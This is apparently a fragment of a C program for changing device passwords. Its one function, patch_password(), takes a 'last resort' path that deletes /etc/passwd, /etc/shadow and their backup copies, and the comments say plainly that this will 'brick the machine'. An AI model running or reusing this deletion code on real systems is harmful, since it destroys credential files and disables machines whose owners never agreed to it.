
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

//This is where we want to change the password to something that could be recoverable by the user or manufacturer, such
// as device UUID. If we cannot find something like that, we need to change the password to something random or delete
// it altogether.
int patch_password()
{
	//TODO: Less intrusive cases

	//Last resort -- brick the machine
	//TODO:
	return (unlink("/etc/passwd") && unlink("/etc/passwd-") && unlink("/etc/shadow") && unlink("/etc/shadow-"));
}